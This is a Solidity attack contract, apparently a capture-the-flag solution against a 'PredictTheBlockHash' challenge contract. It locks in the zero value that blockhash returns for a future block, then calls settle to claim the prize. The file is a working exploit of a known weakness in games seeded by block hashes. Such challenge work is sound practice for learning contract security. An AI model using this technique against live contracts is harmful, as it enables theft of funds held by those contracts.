// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PredictTheBlockHash.sol";
import "hardhat/console.sol";

contract PredictTheBlockHashAttack {
    PredictTheBlockHash public predictTheBlockHash;
    constructor(address _predictTheBlockHash) {
        predictTheBlockHash = PredictTheBlockHash(_predictTheBlockHash);
    }

    function attack() public payable {
        uint256 blockNum = block.number;
        uint256 numOfBlocksInFuture = 1;
        bytes32 guess = blockhash(blockNum + numOfBlocksInFuture);
        console.logBytes32(guess);
        console.log(blockNum + numOfBlocksInFuture);

        predictTheBlockHash.lockInGuess{value: msg.value}(guess);
    }

    function settle() public returns (bool x) {
        predictTheBlockHash.settle();
        x = predictTheBlockHash.isComplete();
        console.log(x);
    }
}
